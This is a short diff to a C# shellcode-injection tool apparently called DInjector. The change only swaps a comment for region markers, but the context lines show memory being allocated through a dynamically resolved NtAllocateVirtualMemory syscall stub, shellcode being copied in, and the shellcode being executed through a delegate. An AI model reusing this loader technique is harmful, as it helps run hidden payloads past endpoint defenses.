@@ -24,7 +24,7 @@ namespace DInjector
         {
             var shellcode = shellcodeBytes;
 
-            // -- NtAllocateVirtualMemory ----------------------------------------
+            #region NtAllocateVirtualMemory
 
             IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
             NtAllocateVirtualMemory sysNtAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));
@@ -53,6 +53,8 @@ namespace DInjector
             Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
             pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(pFunction));
             f();
+
+            #endregion
         }
     }
 }
